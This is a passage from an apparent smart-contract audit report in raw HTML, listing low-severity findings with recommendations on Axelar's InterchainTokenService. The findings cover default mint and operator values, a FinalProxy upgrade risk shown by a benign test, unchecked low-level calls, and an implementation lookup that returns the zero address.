0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-05] Default values for <code>deployAndRegisterStandardizedToken</code> can make it complicated for third party implementers</h2>\n<p>When calling <code>InterchainTokenService</code> to deploy a <code>StandardizedToken</code>, a user supplies <a href=\"https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/its/interchain-token-service/InterchainTokenService.sol#L388-L395\">some parameters for the setup</a>.</p>\n<p>As <code>mintTo</code> for a possible initial mint when setting up the token and <code>operator</code> for the <code>TokenManager</code>; however, <code>msg.sender</code> is used:</p>\n<p><a href=\"https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/its/interchain-token-service/InterchainTokenService.sol#L395-L402\">https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/its/interchain-token-service/InterchainTokenService.sol#L395-L402</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"30\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">its</span><span class=\"mtk1\">/</span><span class=\"mtk12\">interchain</span><span class=\"mtk1\">-</span><span class=\"mtk12\">token</span><span class=\"mtk1\">-</span><span class=\"mtk12\">service</span><span class=\"mtk1\">/</span><span class=\"mtk12\">InterchainTokenService</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">395</span><span class=\"mtk1\">:    ) </span><span class=\"mtk12\">external</span><span class=\"mtk1\"> </span><span class=\"mtk12\">payable</span><span class=\"mtk1\"> </span><span class=\"mtk12\">notPaused</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">396</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">getCustomTokenId</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">salt</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">//                                             here msg.sender is used for mintTo ↓↓↓↓↓↓↓↓↓↓↓</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">397</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">_deployStandardizedToken</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">distributor</span><span class=\"mtk1\">, </span><span class=\"mtk12\">name</span><span class=\"mtk1\">, </span><span class=\"mtk12\">symbol</span><span class=\"mtk1\">, </span><span class=\"mtk12\">decimals</span><span class=\"mtk1\">, </span><span class=\"mtk12\">mintAmount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">398</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenManagerAddress</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">getTokenManagerAddress</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">399</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">TokenManagerType</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenManagerType</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">distributor</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">tokenManagerAddress</span><span class=\"mtk1\"> ? </span><span class=\"mtk12\">TokenManagerType</span><span class=\"mtk1\">.</span><span class=\"mtk12\">MINT_BURN</span><span class=\"mtk1\"> : </span><span class=\"mtk12\">TokenManagerType</span><span class=\"mtk1\">.</span><span class=\"mtk12\">LOCK_UNLOCK</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">400</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenAddress</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">getStandardizedTokenAddress</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">//                 here msg.sender is used for `operator` ↓↓↓↓↓↓↓↓↓↓</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">401</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">_deployTokenManager</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">tokenManagerType</span><span class=\"mtk1\">, </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encode</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">.</span><span class=\"mtk11\">toBytes</span><span class=\"mtk1\">(), </span><span class=\"mtk12\">tokenAddress</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">402</span><span class=\"mtk1\">:    }</span></span></span></code></pre>\n<p>This can make it more complicated for third parties to develop on top of the <code>InterchainTokenService</code>, as they have to keep in mind that the contract calling will be <code>operator</code> and possibly the receiver of any initial mint.</p>\n<h3 id=\"recommendation-4\" style=\"position:relative;\"><a href=\"#recommendation-4\" aria-label=\"recommendation 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendation</h3>\n<p>Consider adding <code>mintTo</code> and <code>operator</code> as parameters that can be passed to the call.</p>\n<h2 id=\"l-06-interchaintokenserviceproxy-is-finalproxy\" style=\"position:relative;\"><a href=\"#l-06-interchaintokenserviceproxy-is-finalproxy\" aria-label=\"l 06 interchaintokenserviceproxy is finalproxy permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-06] <code>InterchainTokenServiceProxy</code> is <code>FinalProxy</code></h2>\n<p><code>InterchainTokenServiceProxy</code> inherits from <code>FinalProxy</code>. This makes it possible for <code>owner</code> to accidentally upgrade <code>InterchainTokenService</code> to an un-upgradable version.</p>\n<h3 id=\"poc-1\" style=\"position:relative;\"><a href=\"#poc-1\" aria-label=\"poc 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>PoC</h3>\n<p>Test in <code>tokenService.js</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"javascript\" data-index=\"31\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">describe</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;Final Upgrade Interchain Token Serivce&#39;</span><span class=\"mtk1\">, () </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">it</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;should upgrade to new token service&#39;</span><span class=\"mtk1\">, </span><span class=\"mtk4\">async</span><span class=\"mtk1\"> () </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">factory</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getContractFactory</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;UpgradedITS&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">wallet</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bytecode</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">factory</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getDeployTransaction</span><span class=\"mtk1\">().</span><span class=\"mtk12\">data</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">finalProxy</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">Contract</span><span class=\"mtk1\">(</span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">service</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">FinalProxy</span><span class=\"mtk1\">.</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">, </span><span class=\"mtk12\">wallet</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">finalProxy</span><span class=\"mtk1\">.</span><span class=\"mtk11\">finalUpgrade</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bytecode</span><span class=\"mtk1\">,</span><span class=\"mtk8\">&#39;0x&#39;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">finalProxy</span><span class=\"mtk1\">.</span><span class=\"mtk11\">isFinal</span><span class=\"mtk1\">()).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk11\">equal</span><span class=\"mtk1\">(</span><span class=\"mtk4\">true</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// contract is final</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">upgradedITS</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">Contract</span><span class=\"mtk1\">(</span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">service</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">UpgradedITS</span><span class=\"mtk1\">.</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">, </span><span class=\"mtk12\">wallet</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">upgradedITS</span><span class=\"mtk1\">.</span><span class=\"mtk11\">foo</span><span class=\"mtk1\">()).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk11\">equal</span><span class=\"mtk1\">(</span><span class=\"mtk7\">4</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    });</span></span></span></code></pre>\n<p><code>UpgradedITS.sol</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"32\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// SPDX-License-Identifier: MIT</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> ^</span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> { </span><span class=\"mtk12\">Upgradable</span><span class=\"mtk1\"> } </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&#39;../../gmp-sdk/upgradable/Upgradable.sol&#39;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">UpgradedITS</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Upgradable</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">private</span><span class=\"mtk1\"> </span><span class=\"mtk12\">constant</span><span class=\"mtk1\"> </span><span class=\"mtk12\">CONTRACT_ID</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;interchain-token-service&#39;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">contractId</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">pure</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">CONTRACT_ID</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_setup</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> ) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> {}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">foo</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">pure</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk7\">4</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<h3 id=\"recommendation-5\" style=\"position:relative;\"><a href=\"#recommendation-5\" aria-label=\"recommendation 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendation</h3>\n<p>Consider inheriting from <code>Proxy</code> instead of <code>FinalProxy</code>.</p>\n<h2 id=\"l-07-low-level-call-will-always-succeed-for-non-existent-addresses\" style=\"position:relative;\"><a href=\"#l-07-low-level-call-will-always-succeed-for-non-existent-addresses\" aria-label=\"l 07 low level call will always succeed for non existent addresses permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-07] Low level <code>call</code> will always succeed for non-existent addresses</h2>\n<p><a href=\"https://docs.soliditylang.org/en/latest/control-structures.html#error-handling-assert-require-revert-and-exceptions\">https://docs.soliditylang.org/en/latest/control-structures.html#error-handling-assert-require-revert-and-exceptions</a>:</p>\n<blockquote>\n<p>The low-level functions call, <code>delegatecall</code> and <code>staticcall</code> return true as their first return value if the account called is non-existent, as part of the design of the EVM. Account existence must be checked prior to calling if needed.</p>\n</blockquote>\n<p>Calls are done in these instances:</p>\n<p><a href=\"https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/cgp/util/Caller.sol#L18\">https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/cgp/util/Caller.sol#L18</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"33\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">cgp</span><span class=\"mtk1\">/</span><span class=\"mtk12\">util</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Caller</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">18</span><span class=\"mtk1\">:        (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">success</span><span class=\"mtk1\">, ) = </span><span class=\"mtk12\">target</span><span class=\"mtk1\">.</span><span class=\"mtk12\">call</span><span class=\"mtk1\">{ value: </span><span class=\"mtk12\">nativeValue</span><span class=\"mtk1\"> }(</span><span class=\"mtk12\">callData</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/interchain-governance-executor/InterchainProposalExecutor.sol#L76\">https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/interchain-governance-executor/InterchainProposalExecutor.sol#L76</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"34\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">interchain</span><span class=\"mtk1\">-</span><span class=\"mtk12\">governance</span><span class=\"mtk1\">-</span><span class=\"mtk12\">executor</span><span class=\"mtk1\">/</span><span class=\"mtk12\">InterchainProposalExecutor</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">76</span><span class=\"mtk1\">:            (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">success</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">result</span><span class=\"mtk1\">) = </span><span class=\"mtk12\">call</span><span class=\"mtk1\">.</span><span class=\"mtk12\">target</span><span class=\"mtk1\">.</span><span class=\"mtk12\">call</span><span class=\"mtk1\">{ value: </span><span class=\"mtk12\">call</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\"> }(</span><span class=\"mtk12\">call</span><span class=\"mtk1\">.</span><span class=\"mtk12\">callData</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>This is mentioned in the <a href=\"https://gist.github.com/thebrittfactor/c400e0012d0092316699c53843ecad41#low-23-contract-existence-is-not-checked-before-low-level-call\">Automated findings report</a> but the instances identified are wrong.</p>\n<h3 id=\"recommendation-6\" style=\"position:relative;\"><a href=\"#recommendation-6\" aria-label=\"recommendation 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendation</h3>\n<p>Where applicable, consider adding a check if there is code on the target.</p>\n<h2 id=\"l-08-interchaintokenservicegetimplementation-returns-address0-for-invalid-types\" style=\"position:relative;\"><a href=\"#l-08-interchaintokenservicegetimplementation-returns-address0-for-invalid-types\" aria-label=\"l 08 interchaintokenservicegetimplementation returns address0 for invalid types permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-08] <code>InterchainTokenService::getImplementation</code> returns <code>address(0)</code> for invalid types</h2>\n<p><a href=\"https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/its/interchain-token-service/InterchainTokenService.sol#L223-L233\">https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/its/interchain-token-service/InterchainTokenService.sol#L223-L233</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"35\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">its</span><span class=\"mtk1\">/</span><span class=\"mtk12\">interchain</span><span class=\"mtk1\">-</span><span class=\"mtk12\">token</span><span class=\"mtk1\">-</span><span class=\"mtk12\">service</span><span class=\"mtk1\">/</span><span class=\"mtk12\">InterchainTokenService</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">223</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">getImplementation</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenManagerType</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenManagerAddress</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">224</span><span class=\"mtk1\">:        </span><span class=\"mtk3\">// There could be a way to rewrite the following using assembly switch statements, which would be more gas efficient,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">225</span><span class=\"mtk1\">:        </span><span class=\"mtk3\">// but accessing immutable variables and/or enum values seems to be tricky, and would reduce code readability.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">226</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">TokenManagerType</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenManagerType</span><span class=\"mtk1\">) == </span><span class=\"mtk12\">TokenManagerType</span><span class=\"mtk1\">.</span><span class=\"mtk12\">LOCK_UNLOCK</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">227</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">implementationLockUnlock</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">228</span><span class=\"mtk1\">:        } </span><span 